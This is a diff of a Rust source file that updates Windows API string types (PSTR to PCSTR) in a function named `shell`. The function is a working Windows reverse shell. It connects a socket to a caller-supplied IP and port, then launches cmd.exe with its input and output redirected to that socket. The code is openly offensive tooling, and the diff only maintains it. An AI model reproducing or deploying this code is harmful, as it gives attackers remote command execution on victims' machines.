@@ -1,7 +1,8 @@
 extern crate windows;
 use std::{mem, ptr};
 use std::ffi::{CString, c_void};
-use windows::Win32::Foundation::{HANDLE, PSTR};
+use windows::core::{PCSTR, PSTR};
+use windows::Win32::Foundation::HANDLE;
 use windows::Win32::Networking::WinSock::{connect, htons, inet_pton, SOCKADDR, SOCKADDR_IN, SOCKET, WSAData, WSASocketA, WSAStartup};
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Threading::{CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA};
@@ -46,7 +47,7 @@ pub fn shell(ip: &str, port: u16) {
     // This is magic that I don't really understand but seems to work
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
     // Create a PSTR and use the IP string as the 0 field
-    let mut ip_pstr: PSTR = unsafe { mem::zeroed() };
+    let mut ip_pstr: PCSTR = unsafe { mem::zeroed() };
     ip_pstr.0 = CString::new(ip).unwrap().into_raw() as *mut u8;
     // Calling pton with the pointer sin_addr_ptr --> sockaddr_in.sin_addr should mean sockaddr_in.sin_addr has the IP struct now
     let conversion_result = unsafe { inet_pton(AF_INET_I32, ip_pstr, sin_addr_ptr) };
@@ -78,13 +79,13 @@ pub fn shell(ip: &str, port: u16) {
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
-    let lp_application_name: PSTR = unsafe { mem::zeroed() };
+    let lp_application_name: PCSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
     lp_command_line.0 = CString::new("C:\\Windows\\System32\\cmd.exe").unwrap().into_raw() as *mut u8;
     let lp_process_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
     let lp_thread_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
     let dw_creation_flags: PROCESS_CREATION_FLAGS = unsafe { mem::zeroed() };
-    let lp_current_directory: PSTR = unsafe { mem::zeroed() };
+    let lp_current_directory: PCSTR = unsafe { mem::zeroed() };
     let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };
     let create_res = unsafe {
         CreateProcessA(lp_application_name,
